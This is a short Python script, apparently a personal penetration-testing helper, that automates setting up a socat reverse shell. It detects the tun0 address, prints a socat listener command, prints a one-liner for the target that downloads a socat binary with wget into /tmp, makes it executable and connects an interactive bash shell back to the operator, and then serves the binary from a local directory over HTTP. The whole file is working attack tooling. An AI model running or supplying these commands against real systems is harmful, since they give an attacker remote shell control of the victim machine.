from locale import format_string
import netifaces as ni
import http.server
import socketserver
import os

ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

wbPort = input("Web Server Port: ")
liPort = input("listner Port: ")
portint = int(wbPort)


print("Please run this command to start listener:")
print()
print("socat file:`tty`,raw,echo=0 tcp-listen:" + liPort)
print()
print("Please run this command on the target system:")
print()
print("wget -q http://" + ip + ":" + wbPort + "/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:" + ip + ":" + liPort)
print()
os.chdir("/home/delur/scripts/reverseshell")
handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(("", portint), handler) as httpd:
    print("web Server is running at http://" + ip + ":" + wbPort)

    httpd.serve_forever() 
